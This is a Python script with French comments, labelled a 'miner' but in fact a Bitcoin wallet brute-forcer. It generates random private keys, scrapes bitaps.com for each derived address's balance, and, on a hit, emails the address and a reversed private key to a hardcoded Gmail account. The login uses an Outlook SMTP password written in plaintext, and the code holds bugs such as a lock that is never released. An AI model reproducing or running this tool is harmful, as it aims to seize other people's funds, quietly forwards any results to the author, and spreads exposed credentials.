
import time
print("────██──██─────\n"
"███████████▄───\n"
"──███████████▄─\n"
"──███────▀████─\n"
"──███──────███─\n"
"──███────▄███▀─\n"
"──█████████▀───\n"
"──███████████▄─\n"
"──███─────▀████\n"
"──███───────███\n"
"──███─────▄████\n"
"──████████████─\n"
"████████████▀──\n"
"────██──██─────\n")
time.sleep(2)

from threading import Semaphore
screenlock = Semaphore(value=1)

def miner():#le code en lui même
    from threading import Semaphore
    from colorama import Back, Fore, Style, deinit, init
    from random import choice, randint
    from bs4 import BeautifulSoup
    import requests
    i = False
    import hashlib
    #j'étais a codes
    import codecs
    import ecdsa
    import base58
    from base58 import b58decode, b58encode
    from time import sleep
    import secrets
    t = 0
    import blocksmith
    stop = "nothing"
    import os
    import sys
    import smtplib, ssl
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from Crypto.Hash import keccak
    checkrep = False

    def clear_console():#définir la fonction qui reset le terminale
        os.system('cls')
    while stop != "stop":#boucle infinie
        while i == False: #tant que l'on a pas trouver d'addresse avec des fonds

            kg = blocksmith.KeyGenerator()#début génération de l'addresse public bitcoin
            kg.seed_input("Trulyrandomstring.Irolledadice and got4.")
            private_key = kg.generate_key()

            private_key_bytes = codecs.decode(private_key, 'hex')
            public_key_raw = ecdsa.SigningKey.from_string(private_key_bytes, curve=ecdsa.SECP256k1).verifying_key
            public_key_bytes = public_key_raw.to_string()
            public_key_hex = codecs.encode(public_key_bytes, 'hex')
            public_key = (b'04' + public_key_hex).decode("utf-8")

            if (ord(bytearray.fromhex(public_key[-2:])) % 2 == 0):
                public_key_compressed = '02'
            else:
                public_key_compressed = '03'

            public_key_compressed += public_key[2:66]

            hex_str = bytearray.fromhex(public_key_compressed)
            sha = hashlib.sha256()
            sha.update(hex_str)
            sha.hexdigest()

            rip = hashlib.new('ripemd160')
            rip.update(sha.digest())
            key_hash = rip.hexdigest()

            modified_key_hash = "00" + key_hash

            sha = hashlib.sha256()
            hex_str = bytearray.fromhex(modified_key_hash)
            sha.update(hex_str)
            sha.hexdigest()

            sha_2 = hashlib.sha256()
            sha_2.update(sha.digest())
            sha_2.hexdigest()

            checksum = sha_2.hexdigest()[:8]

            byte_25_address = modified_key_hash + checksum

            address = base58.b58encode(bytes(bytearray.fromhex(byte_25_address))).decode('utf-8') #Fin de la génération avec comme résultat une adresse au format legacy                     

            url = 'https://bitaps.com/'+address #addresse de la page avec le solde de l'adresse générée

            html_text = requests.get(url).text #on récupère le contenu de la page
            soup = BeautifulSoup(html_text, 'html.parser')

            balancebtc = soup.find("h5", {"class": "bold confirmed-balance"}) #trouver la donnée contenant le solde avec le type de balise et le nom de la classe html
            balance = str(balancebtc)
            h5 = 'h5' #définitions les variables qui nous servirons a filtrer le résultat obtenus
            annoying = '0em'
            useless = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ></=\"_:;$ -"+h5 #fin
            for x in range(len(useless)): # on enleve les caractères non important qui sont la a cause de la récupération des balises HTML
                balance = balance.replace(useless[x],"")
                balance = balance.replace(annoying,"")
                balance = balance.replace("\n","")
            balance_check = float(balance) #nombre de BTC sur l'adresse générée
            
            if  float(balance_check) > 0.0: #si jamais le nombre de BTC sur l'adresse est supérieur à 0       
                screenlock.acquire() #le thread en cours verrouille le terminale pour lui
                init()
                print(Fore.GREEN + Style.BRIGHT + "found")
                print(Fore.GREEN + Style.BRIGHT +"private key = ",private_key)
                if float(balance_check) > 0.0:
                    address_send1 = 'voici la public key :',address," voici le private key : ",str("".join(reversed(private_key))) #on définit le message qui sera envoyée par mail (inversion de l'adresse privée)
                    print(Fore.GREEN + Style.BRIGHT +"public key Bitcoin :",address,"   ", str(balance_check)," BTC") #on imprime la clée public et le nombre de BTC sur l'adresse
                sleep(0.2)
                deinit()
                address_send = str(address_send1)
                msg = MIMEMultipart()
                msg['From'] = 'python.pol29@outlook.fr' #l'adresse depuis laquelle le mail sera envoyée
                msg['To'] = 'pol.drackack@gmail.com' #l'adresse a laquelle le mail sera envoyée
                msg['Subject'] = 'GG Wallet' #sujet
                message = MIMEText(address_send) #message
                msg.attach(message)
                mailserver = smtplib.SMTP('smtp.office365.com', 587) #le serveur SMTP qui nous permettera d'envoyer le mail
                mailserver.ehlo()
                mailserver.starttls()
                mailserver.ehlo()
                mailserver.login('python.pol29@outlook.fr', '236NS1SX1') #on se connecte a l'adresse depuis laquelle on envoie le mail
                mailserver.sendmail('python.pol29@outlook.fr', 'pol.drackack@gmail.com', msg.as_string()) #on envoie le mail
                mailserver.quit()
                t = 0
                i = True
            
            if float(balance_check) == 0.0: #si jamais l'adresse a un solde de 0 BTC
                t = t + 1 

                screenlock.acquire()
                init()
                print(Fore.RED + Style.BRIGHT + "Bitcoin public key = "+address, str(balance_check)+' BTC')           
                deinit()
                screenlock.release()
                if t > 50:
                    clear_console()
                    t = 0

        while i == True: #on attend une action de l'utilisateur pour reprendre le proccesus
            init()
            answer = input(Fore.GREEN + Style.BRIGHT +"Appuyer sur une touche pour continuer !")
            deinit()
            if answer != "stop":
                i = False
